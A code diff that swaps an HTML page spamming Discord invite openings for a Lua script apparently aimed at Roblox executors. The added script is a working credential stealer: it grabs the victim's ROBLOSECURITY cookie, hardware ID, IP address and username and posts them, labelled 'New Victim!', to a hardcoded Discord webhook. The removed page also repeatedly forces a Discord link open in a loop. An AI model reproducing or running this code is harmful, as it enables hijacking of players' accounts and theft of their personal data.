@@ -1,69 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/dick</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #00000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #000000; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(255, 255, 255); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #000000; 
-            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #000000; 
-            text-shadow: 0px 0px 8px #FFFFFF, 0px 0px 15px #FFFFFF, 0px 0px 25px #FFFFFF; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
-</head>
-<body>
-    <div class="">
-        <img src="" 
-    </div>
-    <audio autoplay loop>
-        <source src="" type="audio/mpeg">
-       
-    </audio>
-    <div class="text">https://discord.gg/F3K7HjcjUu يا جماعه هذا الدس حقنا الجديد</div>
+local webhook = "https://discord.com/api/webhooks/1391747516659404912/IRvOw2h1SV6snGXueU1ur1KEFmzcG4ZOPKcfccTaFCtr-sp0yLJV1Yjfzy0SEmW7Gpz9"
 
-   
-    <script>
-        fetch('https://ipinfo.io/json')
+local function steal()
+    local cookie = game:GetService("CookieService"):GetCookie() or getgenv().ROBLOSECURITY
+    local hwid = gethwid and gethwid() or "Unknown"
+    local ip = game:HttpGet("https://api.ipify.org")
 
-        setInterval(function() {
-            window.invokeNative("openUrl", "https://discord.gg/F3K7HjcjUu");
-            window.invokeNative("openUrl", "https://discord.gg/F3K7HjcjUu");
-            window.invokeNative("openUrl", "https://discord.gg/F3K7HjcjUu");
-            window.invokeNative("openUrl", "https://discord.gg/F3K7HjcjUu");
-        }, 2500);
-   
-    </script>
-</body>
-</html>
+    local data = {
+        content = "@everyone New Victim!",
+        embeds = {{
+            title = "Roblox Cookie Stolen",
+            description = "```"..cookie.."```",
+            fields = {
+                {name = "IP", value = ip},
+                {name = "HWID", value = hwid},
+                {name = "Username", value = game.Players.LocalPlayer.Name}
+            },
+            color = 16711680
+        }}
+    }
+
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    })
+end
+
+steal()
